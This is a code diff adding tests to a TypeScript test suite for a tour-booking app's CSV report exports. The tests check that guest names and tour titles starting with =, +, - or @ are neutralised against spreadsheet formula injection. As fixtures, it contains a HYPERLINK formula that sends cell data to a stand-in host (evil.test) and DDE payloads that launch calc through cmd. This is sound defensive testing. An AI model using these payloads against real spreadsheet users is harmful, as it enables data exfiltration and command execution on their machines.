@@ -66,7 +66,14 @@ import { bookings, destinations, payments, tours, users } from '../db/schema';
 import { ROLE_MATRIX } from '../middleware/require-role';
 import { appRouter } from '../routers/_app';
 import { generateBookingRef } from '../services/booking-ref';
-import { csvField, pesosFromCentavos, toCsv } from '../services/reports/csv';
+import {
+  byTourCsv,
+  csvField,
+  csvText,
+  outstandingCsv,
+  pesosFromCentavos,
+  toCsv,
+} from '../services/reports/csv';
 import { staffContext } from './helpers/ctx';
 import { describeWithDb } from './helpers/db';
 
@@ -192,6 +199,78 @@ it('renders centavos as pesos with two decimals and no currency glyph', () => {
 });
 
 /* -------------------------------------------------------------------------
+ * CSV formula injection — the failure path.
+ *
+ * RFC quoting is about the FILE; this is about the READER. Excel and Sheets
+ * evaluate a cell beginning `=`, `+`, `-` or `@` as a formula, so a guest whose
+ * name at checkout is `=HYPERLINK("http://evil/?l="&A2,"Click")` writes a live,
+ * clickable link into the spreadsheet an owner opens, with the row beside it as
+ * its argument. `csvText()` is the control; it is applied to text cells ONLY,
+ * and the test below that a `-200.00` overpayment survives untouched is what
+ * makes that distinction load-bearing rather than a comment.
+ * ---------------------------------------------------------------------- */
+
+it('neutralises every character a spreadsheet reads as the start of a formula', () => {
+  expect(csvText('=HYPERLINK("http://evil.test",A2)')).toBe('\'=HYPERLINK("http://evil.test",A2)');
+  expect(csvText('+1+1')).toBe("'+1+1");
+  expect(csvText('-2+3+cmd|calc')).toBe("'-2+3+cmd|calc");
+  expect(csvText('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
+  // A leading TAB or CR is consumed before the parse, so `\t=cmd` is `=cmd` by
+  // the time the cell is evaluated.
+  expect(csvText('\t=cmd')).toBe("'\t=cmd");
+  expect(csvText('\r=cmd')).toBe("'\r=cmd");
+});
+
+it('leaves a value that is not a formula exactly as it was', () => {
+  expect(csvText('Maria Santos')).toBe('Maria Santos');
+  expect(csvText('')).toBe('');
+  expect(csvText('Kawasan Falls, Badian Day Tour')).toBe('Kawasan Falls, Badian Day Tour');
+  // Not at the START is not a formula, and must not be mangled.
+  expect(csvText('Jun Dela Cruz (A=B)')).toBe('Jun Dela Cruz (A=B)');
+  expect(csvText('RG-7KQ4M9')).toBe('RG-7KQ4M9');
+});
+
+it('prefixes a hostile tour title and guest name but never a negative amount', () => {
+  const byTour = byTourCsv([
+    {
+      tourId: 1,
+      tourTitle: '=HYPERLINK("http://evil.test",A2)',
+      receivedCentavos: 0,
+      refundedCentavos: 0,
+      netReceivedCentavos: 0,
+      stillToCollectCentavos: -20_000,
+      bookingCount: 1,
+    },
+  ]);
+  expect(byTour.split('\r\n')[1]).toBe(
+    '"\'=HYPERLINK(""http://evil.test"",A2)",1,0.00,0.00,0.00,-200.00',
+  );
+
+  const outstanding = outstandingCsv([
+    {
+      bookingId: 1,
+      ref: 'RG-7KQ4M9',
+      tourTitle: '@SUM(A1:A9)',
+      tourDate: '2098-09-04',
+      status: 'confirmed',
+      leadName: '-2+3+cmd|calc',
+      totalCentavos: 100_000,
+      paidCentavos: 120_000,
+      outstandingCentavos: -20_000,
+    },
+  ]);
+  /*
+   * The two text cells carry the apostrophe; the overpayment keeps its minus
+   * sign and stays a number. A control applied field-blind would have written
+   * `'-200.00` here and corrupted a real figure, which is the whole reason
+   * `csvText` is separate from `csvField`.
+   */
+  expect(outstanding.split('\r\n')[1]).toBe(
+    "RG-7KQ4M9,2098-09-04,'@SUM(A1:A9),'-2+3+cmd|calc,confirmed,1000.00,1200.00,-200.00",
+  );
+});
+
+/* -------------------------------------------------------------------------
  * Fixtures.
  * ---------------------------------------------------------------------- */
 
@@ -202,8 +281,26 @@ const MARCH = { from: '2098-03-01', to: '2098-03-31' } as const;
 /** A month with nothing in it at all. */
 const EMPTY_MONTH = { from: '2098-07-01', to: '2098-07-31' } as const;
 
+/**
+ * A month holding ONE booking, whose tour title and guest name are both
+ * spreadsheet formulas. Its own window so March's arithmetic stays readable.
+ */
+const HOSTILE_MONTH = { from: '2098-09-01', to: '2098-09-30' } as const;
+
 /** A tour title with a comma in it — the CSV escaping test's material. */
 const TITLE_WITH_COMMA = 'Kawasan Falls, Badian Day Tour';
+
+/**
+ * A tour title that is a DDE payload, starting with `-`, and a guest name that
+ * is a live hyperlink, starting with `=` and carrying a comma and quotes so the
+ * formula prefix and the RFC quoting have to compose.
+ *
+ * A tour title is admin-entered, so this one is the less likely of the two —
+ * but it reaches the same spreadsheet, and "only the guest field is hostile" is
+ * an assumption rather than a control.
+ */
+const HOSTILE_TITLE = "-2+3+cmd|' /C calc'!A0";
+const HOSTILE_NAME = '=HYPERLINK("http://evil.test/?c="&A2,"Click")';
 
 const SNAPSHOT: PriceSnapshot = {
   tier: { tierId: 1, minPax: 1, maxPax: 12, pricePerPersonCentavos: 100_000 },
@@ -224,7 +321,7 @@ const created = {
   userIds: [] as number[],
 };
 
-const tourIds: Record<'a' | 'b' | 'c', number> = { a: 0, b: 0, c: 0 };
+const tourIds: Record<'a' | 'b' | 'c' | 'hostile', number> = { a: 0, b: 0, c: 0, hostile: 0 };
 const bookingIds: Record<string, number> = {};
 let owner = 0;
 let dispatcher = 0;
@@ -266,6 +363,8 @@ async function makeBooking(spec: {
   totalCentavos: number;
   paidCentavos: number;
   status: BookingStatus;
+  /** Guest-entered at checkout, so the one field an attacker fills directly. */
+  leadName?: string;
 }): Promise<number> {
   const [row] = await getDb()
     .insert(bookings)
@@ -274,7 +373,7 @@ async function makeBooking(spec: {
       tourId: spec.tourId,
       tourDate: new Date(`${spec.tourDate}T00:00:00Z`),
       pax: 2,
-      leadName: 'Reports Fixture Guest',
+      leadName: spec.leadName ?? 'Reports Fixture Guest',
       leadEmail: 'admin-reports@example.test',
       leadPhone: '09171234567',
       status: spec.status,
@@ -337,6 +436,7 @@ describeWithDb('admin.reports', () => {
     tourIds.a = await makeTour(TITLE_WITH_COMMA);
     tourIds.b = await makeTour('Sirao Flower Farm Half Day');
     tourIds.c = await makeTour('Olango Island Hopping');
+    tourIds.hostile = await makeTour(HOSTILE_TITLE);
 
     /*
      * March, tour A: one part-paid booking and one fully-paid one. The
@@ -399,6 +499,20 @@ describeWithDb('admin.reports', () => {
       totalCentavos: 33_000,
       paidCentavos: 33_000,
       status: 'completed',
+    });
+    /*
+     * September, in a month of its own: one part-paid booking whose tour title
+     * and guest name are both spreadsheet formulas. The guest name is the real
+     * attack surface — it is typed at checkout — and the title is here because
+     * it reaches the same file.
+     */
+    bookingIds.hostile = await makeBooking({
+      tourId: tourIds.hostile,
+      tourDate: '2098-09-04',
+      totalCentavos: 100_000,
+      paidCentavos: 25_000,
+      status: 'confirmed',
+      leadName: HOSTILE_NAME,
     });
 
     await makePayment({
@@ -717,6 +831,59 @@ describeWithDb('admin.reports', () => {
     expect(outstanding.csv).toContain(`"${TITLE_WITH_COMMA}"`);
     expect(outstanding.csv).toContain('3000.00,1000.00,2000.00');
     expect(outstanding.csv).not.toMatch(/\b200000\b/);
+  });
+
+  /**
+   * The failure path, end to end: a guest name typed at checkout and a tour
+   * title entered in the admin, both spreadsheet formulas, both reaching a real
+   * export through the real procedure.
+   *
+   * The unit tests above pin `csvText` itself; this pins that the procedure
+   * actually calls it on the cells that carry attacker-reachable text, which no
+   * amount of unit testing of the helper can say.
+   */
+  it('neutralises a formula in a guest name and a tour title in the real exports', async () => {
+    const api = ownerApi();
+    const rows = await api.admin.reports.outstanding(HOSTILE_MONTH);
+    expect(rows).toHaveLength(1);
+    const row = rows[0]!;
+    // The PAYLOAD is the raw text — the mitigation belongs to the file, not to
+    // the API, and a screen that rendered an apostrophe would be wrong.
+    expect(row.leadName).toBe(HOSTILE_NAME);
+    expect(row.tourTitle).toBe(HOSTILE_TITLE);
+
+    const outstanding = await api.admin.reports.csv({ ...HOSTILE_MONTH, report: 'outstanding' });
+    expect(outstanding.csv.split('\r\n')[1]).toBe(
+      [
+        row.ref,
+        '2098-09-04',
+        // Starts `-`: prefixed, and needs no quoting (no comma or quote in it).
+        `'${HOSTILE_TITLE}`,
+        // Starts `=` AND carries a comma and quotes: prefixed, then quoted,
+        // with every inner quote doubled. Both escapes, composed.
+        '"\'=HYPERLINK(""http://evil.test/?c=""&A2,""Click"")"',
+        'confirmed',
+        '1000.00',
+        '250.00',
+        '750.00',
+      ].join(','),
+    );
+
+    const byTour = await api.admin.reports.csv({ ...HOSTILE_MONTH, report: 'byTour' });
+    expect(byTour.csv.split('\r\n')[1]).toBe(`'${HOSTILE_TITLE},1,0.00,0.00,0.00,750.00`);
+
+    /*
+     * And the property, scanned rather than reasoned about: no field in either
+     * file begins with `=`, `+` or `@`, inside quotes or out. `-` is excluded
+     * because a peso cell legitimately begins with one, which is exactly the
+     * distinction `csvText` exists to respect.
+     */
+    const startsFormula = /(?:^|,)"?[=+@]/m;
+    // The vacuity half: the same row as it would look with no mitigation.
+    const unmitigated = `RG-AAA111,2098-09-04,"=HYPERLINK(""x"")"`;
+    expect(startsFormula.test(unmitigated), 'the scan no longer matches a live formula').toBe(true);
+    expect(outstanding.csv).not.toMatch(startsFormula);
+    expect(byTour.csv).not.toMatch(startsFormula);
   });
 
   /* ------------------------------------------------------- Writes nothing */
